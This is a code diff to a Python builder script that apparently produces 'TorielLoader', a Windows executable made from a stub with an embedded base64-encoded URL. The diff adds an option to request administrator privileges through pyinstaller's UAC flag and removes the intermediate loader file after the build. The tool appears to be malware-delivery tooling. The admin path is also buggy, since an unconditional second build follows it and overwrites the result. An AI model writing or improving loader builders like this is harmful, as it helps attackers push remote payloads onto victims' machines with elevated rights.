@@ -11,18 +11,12 @@ def main():
         print(Fore.RED + '[-] You must provide a URL.' + Style.RESET_ALL)
         sys.exit(1)
 
-    exename = input('EXE name to look for (DONT ADD THE EXE EXTENSION): ')
-    if not exename:
-        print(Fore.RED + '[-] You must prvide an EXE name.')
-        sys.exit(1)
-
     try:
         encoded_url = base64.b64encode(url.encode()).decode()
         with open('stub/loader.py', 'r') as file:
             content = file.read()
 
         content = content.replace('TORIEL_URL_HERE', f'"{encoded_url}"')
-        content = content.replace('TORIEL_NAME_FOR_EXE', f'"{exename}"')
 
         if not os.path.exists('dist'):
             os.mkdir('dist')
@@ -31,9 +25,20 @@ def main():
             out.write(content)
 
         print(Fore.GREEN + '[+] Loader built successfully: dist/built_loader.py' + Style.RESET_ALL)
-        print(Fore.BLUE + '[*] Now building the executable...' + Style.RESET_ALL)
+        print(Fore.BLUE + '[*] Should the executable be with administrator privileges? (y/n): ' + Style.RESET_ALL)
+        admin_choice = input().strip().lower()
+
+        if admin_choice == 'y':
+            print(Fore.BLUE + '[*] Building Executable with admin...' + Style.RESET_ALL)
+            print(Fore.YELLOW + '[*] Requesting admin privileges...' + Style.RESET_ALL)
+            os.system('pyinstaller --onefile --uac-admin dist/built_loader.py --distpath dist --name TorielLoader')
+            print(Fore.GREEN + '[+] Executable built successfully with admin privileges: dist/TorielLoader.exe' + Style.RESET_ALL)
+        else:
+            print(Fore.YELLOW + '[*] No admin privileges will be requested.' + Style.RESET_ALL)
+        
         os.system('pyinstaller --onefile dist/built_loader.py --distpath dist --name TorielLoader')
         print(Fore.GREEN + '[+] Executable built successfully: dist/TorielLoader.exe' + Style.RESET_ALL)
+        os.remove('dist/built_loader.py')
 
     except FileNotFoundError:
         print(Fore.RED + '[-] Error: stub/loader.py not found.' + Style.RESET_ALL)
